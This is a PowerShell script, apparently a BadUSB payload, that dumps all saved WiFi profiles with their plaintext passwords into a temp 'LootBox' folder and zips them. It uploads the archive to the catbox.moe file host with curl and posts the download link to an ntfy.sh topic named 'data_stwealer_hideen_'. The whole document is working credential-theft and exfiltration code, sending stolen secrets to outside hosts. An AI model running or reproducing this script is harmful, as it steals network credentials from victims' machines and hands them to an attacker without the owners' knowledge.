$topic = "data_stwealer_hideen_"

Write-Host "=== [ BADUSB DEBUG CONSOLE ] ===" -ForegroundColor Cyan

# 1. Setup Workspace
$dir = "$env:TEMP\LootBox"
$zip = "$env:TEMP\package.zip"

if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. Export WiFi Profiles
Write-Host "[*] Extracting WiFi Profiles..." -ForegroundColor White
netsh wlan export profile folder=$dir key=clear | Out-Null

$fileCount = (Get-ChildItem $dir).Count
Write-Host "[+] Found $fileCount profiles." -ForegroundColor Green

# 3. Create ZIP
Write-Host "[*] Creating ZIP Archive..." -ForegroundColor White
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 4. Upload to Catbox (Reliable Stealth Uploader)
if (Test-Path $zip) {
    Write-Host "[*] Uploading to Catbox..." -ForegroundColor Yellow
    
    # We use curl to send the file to Catbox's API
    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
    
    if ($link -like "http*") {
        Write-Host "[!] SUCCESS! Link: $link" -ForegroundColor Green
        
        # 5. Send to ntfy.sh
        Write-Host "[*] Sending to ntfy..." -ForegroundColor White
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
        Write-Host "[+] Notification Sent!" -ForegroundColor Green
    } else {
        Write-Host "[-] Upload Failed. Response: $link" -ForegroundColor Red
    }
}

# 6. Debug Pause
Write-Host "`n================================" -ForegroundColor Cyan
Write-Host "DONE. Press ENTER to delete local loot and exit." -ForegroundColor Yellow
Read-Host

# Cleanup
Remove-Item -Recurse -Force $dir, $zip
